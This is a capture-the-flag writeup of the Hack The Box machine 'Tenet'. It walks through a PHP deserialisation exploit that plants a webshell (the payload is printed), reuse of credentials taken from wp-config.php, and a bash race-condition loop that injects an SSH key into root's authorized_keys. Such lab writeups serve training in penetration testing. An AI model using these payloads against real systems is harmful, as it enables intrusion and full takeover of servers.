+++
title = "HTB - Tenet"
date = "2025-04-27T00:00:00+00:00"
tags = ["ctf", "htb", "web", "cms", "wordpress", "deserialisation", "race condition"]
description = "Writeup for the 'Medium' rated machine: Tenet"
+++

{{<lead>}}
Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it's backup. It is possible after identificaiton of the backup file to review its source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user `www-data` to user `Neil`. Further system enumeration reveals that this user have root permissions to run a bash script through `sudo`. The script is writing SSH public keys to the `authorized_keys` file of the `root` user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the `authorized_keys` file and use them to login to the system as `root`.
{{</lead>}}

## Port Scanning

From the results of the nmap scan, we see that we have 2 ports open: 22 and 80

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

## Web Server

Navigating to `http://10.10.10.223`, we get the default Apache page

{{<figure src="/img/htb/tenet/apache_default_page.png" position=center caption="Default Apache page">}}

Seeing this, we can try to launch a directory fuzzing in order to discover other pages:

```bash
ffuf -u 'http://10.10.10.223/FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -ic

<SNIP...>

wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 26ms]
```

Short after, we discover a `/wordpress` endpoint. Navigating to `http://10.10.10.223/wordpress` we get the following:

{{<figure src="/img/htb/tenet/wordpress_without_css.png" position=center caption="Wordpress page">}}

Looks like the css did not load properly. Upon examining the page source, we discover that the css file are fetched under the domain `tenet.htb`.

{{<figure src="/img/htb/tenet/page_source.png" position=center caption="Page source">}}

After adding it to our hosts file and reloading the page, we are able to access the blog at `http://tenet.htb`

{{<figure src="/img/htb/tenet/tenet_blog.png" position=center caption="Wordpress page with css">}}

If we navigate at the bottom of the page, we can find something interesting:

{{<figure src="/img/htb/tenet/comment.png" position=center caption="Neil's comment on Migration post">}}

{{<figure src="/img/htb/tenet/migration_post.png" position=center caption="Migration post">}}

In the above comment, neil is mentioning a `sator.php` file and a backup. However `/sator.php` does not exist on the `tenet.htb`, let's try the IP address instead.

{{<figure src="/img/htb/tenet/sator.php.png" position=center caption="/sator.php">}}

We see something that looks like the output of a script. Assuming that the previously mentioned backup is of the `sator.php` file, we could try to get `/sator.php.bak`.


### PHP Code Review

And it indeed works, we downloaded the php file, we can now read its content:

```php
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

This script will initialize the `$input` variable with the value of the GET parameter `arepo` (set to '', if not provided). It will then unserialize it and save it in `$databaseupdate`.

Looking at the `DatabaseExport` class, we see that it has two attributes:
- `$user_file`
- `$data`

The function `update_db()` just outputs some text and update the `$data` variable to 'Success'.

The `__destruct()` function, which is a special function called when an object of type `DatabaseExport` is freed from the memory, will write to a file whatever is in the `$data` variable.

With all this information, we can write a web shell by doing the following:

- Create a serialized object of type `DatabaseExport` with the `$user_file` variable set to the name of our webshell and `$data` set to the actual webshell php code.
- Pass this serialized object to the `sator.php` script through the GET parameter `arepo`.
- Then, the script will instanciate a new object with the provided data.
- Once the execution is done, the `__destruct()` method is called, and our webshell will be written.

### Deserialization to RCE

We can use the following php script to generate our serialized object:

```php
<?php
class DatabaseExport {
    public $user_file = "shell.php";
    public $data = '<?php system($_GET["cmd"]); ?>';
}

$dbe = new DatabaseExport;
echo "-> " . serialize($dbe) . "\n";
?>
```

After executing the script, we get the following serialized object:

```php
O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
```

Now we can send it to the `sator.php` script:

{{<figure src="/img/htb/tenet/sending_payload.png" position=center caption="Sending exploit to /sator.php">}}

Here we notice that `[] Database updated <br>` appears twice, indicating that the `__destruct()` method ran twice, which is a good sign.

Now let's see if our web shell was successfully created:

{{<figure src="/img/htb/tenet/webshell.png" position=center caption="Web shell as www-data">}}

It was created. We can now get a reverse shell:

{{<figure src="/img/htb/tenet/revshell_payload.png" position=center caption="Executing reverse shell">}}

{{<figure src="/img/htb/tenet/revshell.png" position=center caption="Catching reverse shell on netcat listener">}}

## Privesc

### www-data -> neil

Under `/var/www/html/wordpress/wp-config.php`, we can find a database password for the user `neil`:

{{<figure src="/img/htb/tenet/wp-config.png" position=center caption="Credentials in wp-config.php">}}

Using it we can log in as `neil` and retrieve the user flag:

{{<figure src="/img/htb/tenet/user.txt.png" position=center caption="User flag obtained!">}}

### neil -> root

The user `neil` can run the script `/usr/local/bin/enableSSH.sh` as root with no password.

{{<figure src="/img/htb/tenet/neil_sudo_privs.png" position=center caption="Neil's sudo privileges">}}

Let's examine the content of that script:

```bash
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

This script will basically create a temporary file with `mktemp -u /tmp/ssh-XXXXXXXX`, then check if the file is empty and if it is an actual file. If the check passes, the content of the `$key` variable will be appended to it. And finally the temporary will appended to `/root/.ssh/authorized_keys`.

The logic of this script opens the door for a potential race condition attack when the script is checking the newly created file (in the `checkFile()` function). 

To exploit it, we can create a script that will constantly update all temporary file by writting into them our ssh public key. We win the race if our update happens after the check, this will add our public key into `/root/.ssh/authorized_keys` effectively allowing us to login as root.

```bash
while true; do
    for tempfile in $(ls /tmp/ssh-*); do
        echo "<KEY_HERE>" > $tempfile;
    done;
done
```

We will have to run `/usr/local/bin/enableSSH.sh` multiple times until we win the race (the updating script should be running in the background):

{{<figure src="/img/htb/tenet/race_won.png" position=center caption="Race Condition won">}}

We can now login as root with the corresponding private key and retrieve the root flag:

{{<figure src="/img/htb/tenet/root.txt.png" position=center caption="Root flag obtained !">}} 